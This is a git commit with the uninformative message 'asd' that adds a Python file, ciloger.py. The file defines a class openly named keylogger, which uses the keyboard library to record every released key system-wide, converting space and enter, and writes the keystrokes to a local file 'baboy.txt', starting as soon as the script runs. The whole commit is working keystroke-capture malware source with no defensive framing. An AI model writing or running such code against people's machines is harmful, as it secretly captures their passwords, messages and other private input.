81ae1e17f3723531f2a84940df91c90b443500ba
Moxipod <guy.shachar19409@gmail.com>
2025-06-16 12:28:29 +0300

    asd

---
+++ ciloger.py
@@ -0,0 +1,28 @@
+import keyboard
+
+
+
+class keylogger():
+    def __init__(self,logFIle):
+        self.f=open(logFIle,"w")
+
+    def startLog(self):
+      keyboard.on_release(callback=self.callback)
+      keyboard.wait()
+
+    def callback(self,event):
+       button = event.name 
+       if button == "space":
+           button = " "
+       if button == "enter":
+         button ="\n"
+    
+       self.f.write(button)
+       self.f.flush()
+      
+
+
+
+
+ads = keylogger("baboy.txt")
+ads.startLog()
